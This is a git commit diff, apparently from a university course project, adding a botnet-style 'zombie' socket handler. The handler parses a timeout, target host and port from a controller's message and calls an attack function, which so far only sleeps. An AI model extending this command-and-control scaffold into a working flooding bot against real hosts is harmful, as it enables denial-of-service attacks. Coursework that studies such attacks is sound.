dbc268cc52371591ae1b97213fe6347ec4b807dc
Dillon Laird <dillonlaird@d-69-91-152-47.dhcp4.washington.edu>
2013-11-23 17:29:27 -0800

    runs attack function

--- project3/zombie.py
+++ project3/zombie.py
@@ -1,12 +1,15 @@
 import SocketServer
+import time
 
 class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
         self.data = self.request.recv(1024).strip()
-        print "{} wrote:".format(self.client_address[0])
-        print self.data
-        response = "ACK"
-        self.request.sendall(response)
+        timeout, target, port = self.data.split(" ")
+        self.request.sendall("ACK")
+        self.attack(float(timeout), target, int(port))
+
+    def attack(self, timeout, target, port):
+        time.sleep(timeout)
 
 if __name__ == '__main__':
     HOST, PORT = '69.91.152.47', 15000
